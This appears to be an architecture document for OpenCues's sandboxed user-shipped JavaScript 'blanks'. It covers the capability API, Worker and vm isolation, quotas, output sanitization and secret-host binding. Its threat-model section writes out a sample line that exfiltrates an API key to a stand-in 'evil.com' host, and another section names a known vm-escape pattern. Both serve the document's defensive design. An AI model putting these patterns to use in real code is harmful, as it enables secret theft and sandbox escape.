# User-Shipped JS Blanks

How third parties write and ship their own blank logic in JavaScript,
running inside a capability-constrained context the runtime
provides. Same threat-isolation philosophy as Figma plugins:
declared permissions, message-passing bridge, no host access by
default.

## Why it exists

OpenCues blanks come in three shapes:

| Profile | Where the logic lives | Cross-host? | Sandbox? |
|---|---|---|---|
| **`stepValues:`** (static lists) | The `BLANK.md` itself | ✓ all hosts | n/a (no code execution) |
| **`blankScript:`** (shell scripts) | Sibling `.sh`/`.py`/etc. file | Native hosts; chrome via host | OS-level sandbox (opt-in via `sandbox: strict`) |
| **`impl:` <registry-name>** | A TS class in `@opencues/runtime` | ✓ all hosts | n/a (in-process, trusted code) |
| **`impl:` `./blank.js`** (NEW) | User-shipped JS module | ✓ all hosts | Capability-constrained context |

The new flavour fills a real gap: most blanks people want to write
are pure HTTP-fetching or LLM-calling, not shell-script-driven, and
they want them to work in Chrome (where `blankScript:` requires the
native-messaging host) without forking the runtime.

## The author's view

```yaml
# ~/.cues/blanks/gh-issues/BLANK.md
---
name: gh-issues
type: blank
tip: open issue count for a github repo
blankKeywords: gh
blankAutoPopulate: true
impl: ./blank.js
network: [api.github.com]
storage: gh-issues
# Optional: lower rate-limits (defaults are 120 fetches/min, 30 LLM/min, 1MB storage)
# max-fetches-per-minute: 30
# Optional: secrets the blank may read via ctx.secrets.<NAME>. Every
# secret MUST be paired with a secret-hosts.<NAME>: [host, ...] entry —
# unbound secrets are refused at load time.
# secrets: [GITHUB_TOKEN]
# secret-hosts.GITHUB_TOKEN: [api.github.com]
---
```

```js
// ~/.cues/blanks/gh-issues/blank.js
export default {
  async get(ctx, args) {
    // args is [keyword, ...context-words] — same shape as built-in
    // impl: classes get
    const repo = args[1] ?? 'opencues/opencues';
    const cached = await ctx.storage.get(`count:${repo}`);
    const cacheTs = await ctx.storage.get(`ts:${repo}`);
    // Use cache if <5 min old
    if (cached && cacheTs && ctx.now() - parseInt(cacheTs, 10) < 300_000) {
      return `${cached} open (cached)`;
    }
    const r = await ctx.fetch(`https://api.github.com/repos/${repo}`);
    const json = await r.json();
    const count = String(json.open_issues_count ?? 0);
    await ctx.storage.set(`count:${repo}`, count);
    await ctx.storage.set(`ts:${repo}`, String(ctx.now()));
    return `${count} open`;
  },
};
```

Typing `gh opencues/opencues _` in any text input fires the blank.
Five-minute caching keeps the github API quota intact across
repeated invocations.

## The `BlankContext` API

The runtime hands the blank's exported `get`/`set` functions a
`ctx` object containing only the capabilities the blank's
frontmatter declared. Everything else is `undefined`.

| `ctx` field | Frontmatter trigger | What it does |
|---|---|---|
| `ctx.fetch(url, init?)` | `network: [host1, host2]` | Fetch a URL whose hostname is in the allow-list. http/https only. Throws on disallowed origin. Rate-limited (default 120/min). Refuses to send a request whose URL/headers/body contain a bound secret value to a host outside that secret's allow-list. |
| `ctx.llm({prompt, system?, model?, maxTokens?, temperature?})` | `llm: <provider>` | Send a prompt through the runtime's LLM stack. Provider is fixed; user can't pick endpoints. Rate-limited (default 30/min). Same secret-binding check as `ctx.fetch` applies to the prompt body. |
| `ctx.storage.get(key)` / `.set(key, value)` | `storage: <namespace>` | Read/write namespaced state. Other namespaces are unreadable. Total bytes capped (default 1MB; hard ceiling 10MB). |
| `ctx.secrets.<NAME>` | `secrets: [NAME]` + `secret-hosts.NAME: [host]` | Read-only access to a host-injected secret value. Only declared names exist on the object; unbound secrets are refused at load time. |
| `ctx.now()` | always | `Date.now()`. Available because some contexts mock or freeze `Date`. |
| `ctx.log(level, msg, data?)` | always | Append to the runtime's per-host log. `level`: `info`/`warn`/`error`. |

What's deliberately not in `ctx`:

- **`fs`, `path`, `os`, `process`** — no filesystem, no env vars, no
  process info. `require` is `undefined`.
- **The runtime's internals** — no `Resolver`, no `ConfigLoader`, no
  state. The blank is sealed from the host runtime.
- **`Buffer`, `__dirname`, `__filename`** — no Node primitives.
- **DOM / `window` / `chrome.*`** — in the chrome path, the user's
  JS runs in a Web Worker that has none of these.

## Module contract

The user's JS module must `export default` an object with at least
`.get`. Other methods are optional:

```ts
interface UserBlankModule {
  // Required. Fills the `_` when the user types the keyword.
  get(ctx: BlankContext, args: readonly string[]): Promise<string> | string;
  // Optional. Cycling Up/Down on the blank value calls these.
  set?(ctx: BlankContext, value: string, args: readonly string[]): Promise<void> | void;
  up?(ctx: BlankContext): Promise<string> | string;
  down?(ctx: BlankContext): Promise<string> | string;
  // When true, set/up/down are ignored — display-only.
  readOnly?: boolean;
}
```

Modern ES syntax works (`export default`, `async/await`, optional
chaining). `import` statements are stripped at load time and dynamic
`import()` expressions are refused with a clear error — the blank is
a single file with no module loading. The rewriter is AST-based
(acorn) so `export default` inside a string / template literal /
comment is NOT touched; only syntactically real keywords are
rewritten.

## How isolation works

Two implementations, same shape:

### Native hosts (CC / OpenCode / Gemini-CLI)

Each invocation runs inside `vm.runInContext(source, sandbox)` where
`sandbox` is a fresh object containing only the BlankContext + the
JavaScript primitives the user code needs (`Promise`, `URL`, `JSON`,
`Math`, `Date`, `RegExp`, `setTimeout`, ...).

- `vm.createContext({})` starts with an empty global scope.
- No `require`, no `process`, no `Buffer` — these are Node's
  per-module hoisted bindings; in an empty context they don't
  exist.
- `({}).constructor.constructor("return process")()` is the
  classic vm-escape pattern. It works to the extent that it
  evaluates `process` in the user-context realm — but our realm
  doesn't have `process` defined, so the result is `undefined`. The
  escape attempt succeeds at the function-creation step but yields
  nothing useful.

### Chrome

A Web Worker per blank. The harness embeds the user's source at
Worker construction time (concatenated as a single blob URL) — no
`new Function()`, no runtime `eval` — so the bundle works under
strict-dynamic CSP (claude.ai, etc.) where eval is refused.

1. Main thread rewrites `export default`/`import` via the shared
   AST rewriter, concatenates `harness-prefix + user-source +
   harness-suffix` into one blob URL, spawns the Worker.
2. The Worker listens for `invoke` messages: builds `ctx` with
   capability proxies that `postMessage` to the main thread.
3. Main thread fulfils `ctx.*` calls after re-checking the
   allow-list + quota + secret-binding — defence in depth. Worker
   context has no DOM, no `chrome.*`, no access to the content
   script's globals.

```
content script (main thread)         Worker (user JS context)
  │                                    │
  ChromeUserBlank.get(keyword, ctx)    │
  │                                    │
  postMessage({type:'invoke',...}) ──► │
                                       │
                                       module.get(ctx, args)
                                       │
                                       ctx.fetch(url)
                                       │  postMessage({type:'ctx-call', method:'fetch', args:[url]})
                                  ◄────┤
  // re-check allow-list, route        │
  // via SW's opencues:fetch proxy     │
                                  ────►│  (Response-like back)
                                       │
                                       return result
                                       │
                                  ◄────┤  postMessage({type:'invoke-result', ...})
  resolve(result)                      │
```

## Capability enforcement

Per-capability checks happen in both layers (in-Worker + main-thread
re-validation). The runtime-wide defences applied to every capability
call:

| Defence | Where | Scope |
|---|---|---|
| **Hostname allow-list** | `ctx.fetch` | http(s) only; hostname must be in `network: [...]` |
| **Quota** | `ctx.fetch`, `ctx.llm` | Sliding-60s window (120 fetch/min, 30 LLM/min defaults; hard ceilings 600/120) |
| **Storage namespace cap** | `ctx.storage.set` | Full-namespace byte cap before write (1MB default; 10MB ceiling) |
| **Secret host binding** | `ctx.fetch`, `ctx.llm` | Outbound request URL/headers/body (and LLM prompt body) scanned for bound secret values; refused if target host not in `secret-hosts.<NAME>` |
| **Output sanitization** | every `get`/`up`/`down` return | Strip HTML tags / zero-width / bidi overrides, NFKC-normalize, 8KB cap. Bypass via `output: rich`. |

Plus the per-capability rules:

- **`network`**: parses URL, refuses non-http(s), refuses
  unlisted hostnames. On chrome the main thread re-validates before
  issuing the actual HTTP request via the SW fetch proxy.
- **`storage`**: namespace is bound at registration and never
  exposed in `ctx`. A blank cannot read another blank's namespace.
- **`llm`**: the provider is fixed at frontmatter time. The user
  can't pass `endpoint:` or override the provider — they get
  whatever the runtime is configured for. Endpoints are validated
  against the stock provider allow-list (see
  `docs/architecture/chrome-security.md`).
- **`secrets`**: every name listed in `secrets:` MUST have a
  matching `secret-hosts.<NAME>: [host, ...]` entry. Unbound
  secrets are refused at load time. Only declared names reach the
  Worker / vm context.

A blank that declared no capabilities can still call `ctx.now()`
and `ctx.log(...)`, but `ctx.fetch`, `ctx.llm`, `ctx.storage`,
`ctx.secrets` are all `undefined`. Trying to invoke a missing
method is a synchronous TypeError inside the user's code — the
blank fails visibly.

## Output sanitization

Every value a blank returns from `get`/`up`/`down` is sanitized at
the trust boundary (the main-thread side of the Worker, or the
caller side of the vm context):

- HTML tags stripped (`<script>`, `<iframe>`, anything matching
  `</?\s*[a-zA-Z][^>]*>`).
- Zero-width characters, bidi overrides, and other invisible
  control chars removed.
- NFKC-normalized so visually-confusable characters land on the
  same canonical form.
- Length capped at 8KB.

If your blank legitimately needs HTML, emoji ZWJ sequences, or
similar control chars in its output (e.g. a country-flag blank that
emits a `🇬🇧`-style flag whose codepoints include ZWJ), declare:

```yaml
output: rich
```

The length cap still applies (8KB); content stripping does not.
`output: rich` is opt-in trust — only enable it if you're confident
the blank's output can't be hijacked by remote data.

## Quotas

| Cap | Default | Hard ceiling | Frontmatter override |
|---|---|---|---|
| Fetches per minute | 120 | 600 | `max-fetches-per-minute: <n>` |
| LLM calls per minute | 30 | 120 | `max-llm-per-minute: <n>` |
| Storage bytes (namespace-wide) | 1 MB | 10 MB | `max-storage-bytes: <n>` |

The quota tracker uses a sliding-60s window for rate limits — newer
+ cheaper than `setInterval`-based windowing. Exceeded caps throw a
descriptive Error inside the blank ("quota: fetch rate-limit
exceeded (120/min)") rather than silently failing.

## Per-secret host bindings

Threat: a malicious blank declares `network: [api.legit.com,
evil.com]` AND `secrets: [GROQ_API_KEY]`, then exfils the key
via `fetch('https://evil.com', { headers: { x: ctx.secrets.GROQ_API_KEY } })`.

Defence: every secret a blank declares must be bound to specific
hostnames. When `ctx.fetch` (or `ctx.llm`) is about to send a
request, the runtime scans the URL, headers, and body for any
bound secret value; if found, the target hostname must be in that
secret's allow-list, else the request is refused with:

```
ctx.fetch: secret "GROQ_API_KEY" is bound to [api.groq.com],
cannot be sent to "evil.com"
```

Frontmatter form (required when `secrets:` is declared):

```yaml
secrets: [GROQ_API_KEY, FINNHUB_API_KEY]
secret-hosts.GROQ_API_KEY: [api.groq.com]
secret-hosts.FINNHUB_API_KEY: [finnhub.io]
```

Authors who don't supply a binding get a clear load-time error:

```
user blank "stocks": secrets [FINNHUB_API_KEY] declared without
secret-hosts.<NAME> bindings — refusing to load. Add e.g.
`secret-hosts.FINNHUB_API_KEY: [api.example.com]` to BLANK.md frontmatter.
```

## Storage semantics

Per-blank namespace, per-host storage backend:

- **Native hosts**: `~/.cues/.user-blank-state/<namespace>.json` —
  one JSON file per namespace, atomic read/merge/write per
  set/get. Cheap at the scale these blanks operate (one
  read+write per `_` fill).
- **Chrome**: `chrome.storage.local['opencues_user_blank:<namespace>:<key>']`.
  Same key shape; same persistence across browser restarts.

What this means:

- State survives across host restarts and across blank reloads.
- A blank's state is invisible to other blanks even if they're in
  the same `.cues/blanks/<name>/` tree.
- Corrupted state files recover gracefully (return `null` on
  parse failures, accept new writes).

## Trust model

Same as the rest of OpenCues: scripts and modules under `~/.cues/`
run with the user's permissions. The runtime contains them via
capabilities, but the user is responsible for what they install:

- **You trust the cue pack's author.** A `network: [evil.example]`
  declaration is honoured — if the user installed a pack that
  declares that, the runtime fetches from `evil.example` because
  the user said yes by installing.
- **But the blast radius is small.** The most a misbehaving user
  blank can do is fetch from its declared hostnames, read/write
  its own storage namespace, call the LLM with its declared
  provider. It cannot read your filesystem, run other scripts,
  read `chrome.storage`, or call `chrome.*` APIs.
- **And it can't escalate.** Unlike a `blankScript:` blank (which
  has full user permissions on the host filesystem), a user JS
  blank is bounded by the capabilities it declared. Even a
  malicious one can't `rm -rf` your home directory.

This is why **user JS blanks are the recommended path for
distributable functionality** — they have a real capability
contract you can audit at install time. `blankScript:` blanks
remain available for system control (volume, brightness, etc.) but
are explicitly carved out of any future registry distribution.

## What's open

- **`opencues validate`** should lint user-blank capabilities:
  warn on `secret-hosts.<NAME>` pointing at a host not in
  `network:` (orphan binding), warn on `secrets:` declared but
  never read from the JS source, warn on unknown LLM providers,
  warn when the JS file doesn't exist on disk.
- **Spec update** — `spec/blank-spec.md` describes `impl:` as a
  registry name only; needs a section on the relative-path form
  plus the new capability fields (`secret-hosts.*`, `output:`,
  `max-*-per-minute`, `max-storage-bytes`).
- **TypeScript .d.ts** so authors get autocomplete for `ctx`.

The Node side and the Chrome side are both fully wired and
end-to-end verified, including: capability proxies, AST rewriter,
quota tracker, secret-binding leak guard, output sanitizer, and
the chrome LLM bridge (resolveLLM → buildProviderRequest → SW
fetch proxy).
